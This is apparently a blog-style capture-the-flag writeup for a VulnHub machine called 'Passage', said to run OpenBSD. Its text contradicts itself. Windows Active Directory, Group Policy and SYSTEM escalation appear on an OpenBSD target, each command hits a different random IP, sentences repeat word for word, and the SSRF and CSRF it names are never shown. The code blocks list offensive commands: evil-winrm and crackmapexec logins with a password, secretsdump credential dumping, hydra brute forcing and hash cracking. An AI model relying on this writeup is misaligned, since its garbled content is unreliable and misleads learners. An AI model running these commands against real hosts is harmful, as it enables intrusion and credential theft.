---
TitleSEO: "VulnHub — Passage (Hard OpenBSD) | ZureFX"
TitlePost: "VulnHub — Passage (Hard OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Passage. SSRF and CSRF to achieve hard compromise on OpenBSD."
Keywords: "linux, tryhackme, ctf, hackthebox"
URL: "https://zurefx.github.io/writeups/htb-passage-655.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-passage-655/"
Date: "2025-08-25"
Tags: "Linux, TryHackMe, CTF, HackTheBox"
Section: "writeups"
Lang: "en"
main_img: "htb-passage-655"
Permalink: "/writeups/htb-passage-655.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Passage** is rated **Hard** on VulnHub. It runs **OpenBSD** and the IP address during this analysis was `10.70.152.51`.

### Objectives

The service account had excessive permissions assigned in Active Directory. The scheduled task ran with elevated privileges and could be abused for escalation.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
evil-winrm -i 10.61.38.62 -u administrator -p 'P@ssw0rd!'
evil-winrm -i 10.118.218.12 -u administrator -p 'P@ssw0rd!'
gobuster dir -u http://10.68.233.4/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
evil-winrm -i 10.19.7.105 -u administrator -p 'P@ssw0rd!'
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI).

### Service Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.85.31.119/FUZZ
feroxbuster -h
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.105.242.53/FUZZ
```

Post-exploitation enumeration revealed a path to domain administrator privileges. The application stored sensitive credentials in an unencrypted configuration file.

### SMB Enumeration

Group Policy Preferences contained encrypted but recoverable credentials. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
evil-winrm -i 10.42.193.244 -u administrator -p 'P@ssw0rd!'
```

Privilege escalation was possible due to misconfigured sudo permissions. The service was running without proper input validation, leading to injection vulnerabilities. The application stored sensitive credentials in an unencrypted configuration file.

## Exploitation

### Vulnerability Identification

The target system was identified as running a vulnerable version of the service. Lateral movement was facilitated by reusing discovered credentials across services. Group Policy Preferences contained encrypted but recoverable credentials.

Key finding: **SSRF**.

Token impersonation allowed elevation to SYSTEM privileges on the target. Lateral movement was facilitated by reusing discovered credentials across services.

### Initial Access

Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file.

```bash
feroxbuster -h
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.50.184.138/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
nmap -sCV -p143,445,5432 10.11.159.248 -oN scan.txt
```

Initial enumeration revealed several interesting open ports on the target. Network traffic analysis revealed unencrypted communications containing user credentials. The service was running without proper input validation, leading to injection vulnerabilities.

## Privilege Escalation

### Enumeration

Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI). Command injection was possible through unsanitized user input in the search functionality.

```powershell
gobuster dir -u http://10.82.177.179/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
impacket-secretsdump administrator:'P@ssw0rd!'@10.96.169.166
crackmapexec smb 10.44.2.108 -u administrator -p 'P@ssw0rd!' --shares
```

### Exploitation

The web application was vulnerable to Server-Side Template Injection (SSTI). The application stored sensitive credentials in an unencrypted configuration file.

```powershell
gobuster dir -u http://10.117.197.216/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.80.46.43/FUZZ
crackmapexec smb 10.74.148.226 -u administrator -p 'P@ssw0rd!' --shares
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.77.21.60 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```

The backup files contained sensitive information that should not have been accessible. The target system was identified as running a vulnerable version of the service.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

Command injection was possible through unsanitized user input in the search functionality. Token impersonation allowed elevation to SYSTEM privileges on the target.

## Summary

### Tools Used

- `secretsdump`
- `enum4linux`
- `rubeus`
- `nmap`
- `hydra`
- `lookupsid`
- `chisel`

### Key Takeaways

- SSRF
- CSRF
- Subdomain Takeover
- Remote File Inclusion
